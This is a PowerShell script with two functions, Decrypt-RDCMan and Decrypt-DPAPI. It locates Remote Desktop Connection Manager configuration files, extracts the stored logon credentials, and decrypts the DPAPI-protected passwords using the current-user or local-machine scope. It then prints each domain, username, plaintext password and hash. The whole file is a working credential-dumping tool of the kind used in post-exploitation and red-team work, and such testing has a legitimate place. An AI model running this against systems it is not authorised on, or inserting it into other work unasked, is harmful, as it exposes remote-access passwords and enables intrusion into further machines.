function Decrypt-RDCMan ($FilePath) {
<#
.SYNOPSIS

This script should be able to decrpt all passwords stored in the RDCMan config file

Function: Decrypt-RDCMan
Author:Ben Turner @benpturner, Rich Hicks @scriptmonkey_
	
.EXAMPLE

Decrypt-RDCMan -FilePath
#>
    if (!$FilePath) {
        [xml]$config = Get-Content "$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings"
        $Xml = Select-Xml -Xml $config -XPath "//FilesToOpen/*"
        $Xml | select-object -ExpandProperty "Node"| % {Write-Output "Decrypting file: " $_.InnerText; Decrypt-RDCMan $_.InnerText}
    } else {
    [xml]$Types = Get-Content $FilePath

    $Xml = Select-Xml -Xml $Types -XPath "//logonCredentials"

    # depending on the RDCMan version we may need to change the XML search 
    $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password; $_.Domain + "\" + $_.Username + " - " + $Pass + " - " + "Hash:" + $_.Password + "`n" } 

    # depending on the RDCMan version, we may have to use search through the #text field in the XML structure 
    $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password."#text"; $_.Domain + "\" + $_.Username + "`n" + $Pass + " - Hash: " + $_.Password."#text" + "`n"}
    }
}

function Decrypt-DPAPI ($EncryptedString) {
    # load the Security Assembly into the PS runspace
    Add-Type -assembly System.Security
    $encoding= [System.Text.Encoding]::ASCII
    $uencoding = [System.Text.Encoding]::UNICODE

    # try and decrypt the password with the CurrentUser Scope
    try {
    	$encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
        $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
        echo $myStr1
    } 
    catch {
        # try and decrypt the password with the LocalMachine Scope only if the CurrentUser fails
        try {
            $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
            $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
            [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
            echo $myStr1
        }
	    catch {
            echo "Could not decrypt password"
        }
    }
}


